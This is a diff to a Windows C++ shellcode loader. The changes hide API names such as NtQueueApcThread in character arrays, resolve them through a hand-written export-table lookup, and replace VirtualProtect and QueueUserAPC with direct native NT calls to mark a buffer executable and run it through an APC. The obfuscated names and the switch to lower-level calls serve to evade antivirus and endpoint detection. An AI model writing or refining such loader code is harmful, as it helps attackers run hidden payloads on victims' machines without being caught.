@@ -9,10 +9,34 @@
 #pragma comment (lib, "advapi32")
 #pragma comment(lib, "ntdll")
 
+extern "C" NTSTATUS NTAPI NtProtectVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PULONG ProtectSize,
+    ULONG NewProtect,
+    PULONG OldProtect
+);
+
+typedef NTSTATUS(NTAPI *NtQueueApcThreadType)(
+    HANDLE ThreadHandle,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcArgument1,
+    PVOID ApcArgument2,
+    PVOID ApcArgument3
+);
+
+
+typedef BOOL(WINAPI* WriteProcessMemoryPtr)(
+    HANDLE hProcess,
+    LPVOID lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
 // Custom GetProcAddress function
 typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);
 
-FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+FARPROC myGetProcAddress(HMODULE hModule, const unsigned char* lpProcName) {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
@@ -31,14 +55,8 @@ FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     return NULL;
 }
 
-typedef BOOL(WINAPI* WriteProcessMemoryPtr)(
-    HANDLE hProcess,
-    LPVOID lpBaseAddress,
-    LPCVOID lpBuffer,
-    SIZE_T nSize,
-    SIZE_T* lpNumberOfBytesWritten
-);
 
+unsigned char NWVR[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
 unsigned char HvqNFK[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
 unsigned char sQKsNqz[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
 unsigned char UHVQNq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
@@ -135,16 +153,22 @@ else {
    
 }
 
-    RtlCopyMemory(Random5, Random3, Random3_len);
+    CopyMemory(Random5, Random3, Random3_len);
 
     DWORD oldProtect;
-    VirtualProtect(Random5, Random3_len, PAGE_EXECUTE_READ, &oldProtect);
+NtProtectVirtualMemory(GetCurrentProcess(), &Random5, &Random3_len, PAGE_EXECUTE_READ, &oldProtect);
 
     ULONG_PTR additionalData = 0;
 
     PTHREAD_START_ROUTINE Random8 = (PTHREAD_START_ROUTINE)Random5;
 
-    QueueUserAPC((PAPCFUNC)Random8, GetCurrentThread(), additionalData);
+NtQueueApcThreadType NtQueueApcThread = (NtQueueApcThreadType)myGetProcAddress(
+    GetModuleHandle(HvqNFK), NWVR);
+
+if (NtQueueApcThread != nullptr) {
+    // Call NtQueueApcThread directly
+    NtQueueApcThread(GetCurrentThread(), (PIO_APC_ROUTINE)Random8, additionalData, nullptr, nullptr);
+}
 
     Random7();
 
